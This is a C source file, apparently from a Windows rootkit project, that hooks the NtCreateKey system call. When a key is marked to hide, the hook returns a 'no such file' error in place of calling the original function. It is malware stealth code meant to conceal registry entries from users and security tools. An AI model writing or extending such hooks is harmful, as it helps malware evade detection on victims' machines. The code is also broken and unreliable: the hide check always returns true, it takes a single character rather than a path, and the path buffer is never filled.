#include "stdafx.h"

#include "NtCreateKey.h"
#include "hooking.h"

BOOL mustHideReg(TCHAR filePath) {
    return TRUE; // TODO check la fin de la string avec des constantes
}


NTSTATUS NTAPI NewNtCreateKey(
	PHANDLE				KeyHandle,
	ACCESS_MASK			DesiredAccess,
	POBJECT_ATTRIBUTES	ObjectAttributes,
	ULONG				TitleIndex,
	PUNICODE_STRING		Class,
	ULONG				CreateOptions,
	PULONG				Disposition)
{
	TCHAR sPath[MAX_PATH];
	DWORD dwRet = 0;
	
	//dwRet = GetFinalPathNameByHandle(*KeyHandle, sPath, MAX_PATH, VOLUME_NAME_NONE);

	if (!mustHideReg(*sPath))
		return ((TD_NtCreateKey) hooking_getOldFunction("NtCreateKey")) (KeyHandle, DesiredAccess, ObjectAttributes, TitleIndex, Class, CreateOptions, Disposition);
	return 0xC000000F; // STATUS_NO_SUCH_FILE
}